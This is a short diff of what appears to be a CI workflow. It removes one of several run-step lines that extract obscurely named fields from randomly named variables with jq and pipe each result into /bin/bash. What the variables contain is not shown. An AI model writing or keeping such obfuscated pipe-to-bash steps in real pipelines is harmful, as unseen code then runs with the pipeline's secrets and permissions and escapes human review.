@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
           printf '%s' "$lykdy977" | jq -r .sagg4099 | /bin/bash
-          printf '%s' "$e228" | jq -r .et830 | /bin/bash
           echo $e1 | jq -r .mpmqd417 | /bin/bash
           printf '%s' "$a2095" | jq -r .f54197 | /bin/bash
 
